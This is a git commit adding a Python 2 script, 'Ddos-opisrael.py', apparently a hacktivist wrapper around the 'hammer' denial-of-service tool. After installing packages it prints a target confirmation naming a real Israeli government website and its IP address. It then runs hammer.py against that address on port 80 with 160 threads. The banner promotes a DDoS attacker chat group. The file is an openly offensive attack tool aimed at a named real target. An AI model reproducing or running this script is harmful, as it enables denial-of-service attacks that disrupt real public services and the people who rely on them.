94000c4d01a4d0b220ba386464560b8aed62e8a0
TheAMLHacker <52083872+TheAMLHacker@users.noreply.github.com>
2019-06-22 20:17:39 +0700

    Add files via upload

---
+++ Ddos-opisrael.py
@@ -0,0 +1,79 @@
+#sdcard/TheAMLHacker
+# Import Data
+
+from optparse import OptionParser
+from time import sleep
+import socket
+import time
+import os
+
+# menu internal
+
+print      "\033[0;34m""""
+
+  ---------------------------------------------------------------------------------------- 
+  ===================================== Ddos opisrael ====================================                                                     =================================  By : The AML Hacker =================================   
+  ---------------------------------------------------------------------------------------- 
+thanks to cyweb for the hammer tools to coover with this tools
+
+To use please select turbo by : python2 Ddos-opisrael.py -St (isikan turbo di sini)
+    """
+
+#system runner
+
+sleep(1)
+"\033[0;34m"
+os.system(' pkg install git && pkg update git -y ')
+os.system(' pkg install python -y ')
+os.system('clear')
+
+"\033[1;33m"
+print 'membuka hammer........'
+
+sleep(2)
+os.system('clear')
+
+# exsternal menu
+
+sleep(1)
+os.system('clear')
+print "\033[1;33m"'instalasi selesai beralih ke menu selanjutnya .....'
+sleep(1)
+os.system('clear')
+"\033[1;32m"
+sleep(1)
+print '  ,===============================, '
+sleep(1)
+print '   menjalankan perintah ddos ....   '
+sleep(1)
+print '  ,===============================, '
+sleep(2)
+
+#confirmation ip
+
+print "\033[1;32m"  """
+           mengkonfirmasi target ddos
+                web : mfa.gov.il
+               ip :147.237.76.106
+
+     """
+#next phase
+
+print 'memulai proses penddosan'
+
+# time to ddos
+os.system('python hammer.py -s 147.237.76.106 -p 80 -t 160 ')
+
+#new block 
+sleep(1)
+print "\033[1;32m""""    
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|        
+ ============> this is a cover of tools hammer <===============|
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|
+hammer made by : yalcin (cyweb)                                |
+cover made by  : TheAMLHacker                                  |
+Group          : Ddos Attacker Id                              |
+link group     : https://chat.whatsapp.com/HKTFFLs8hTECOyAIUtQ |
+fU9                                                            |
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|
+   """
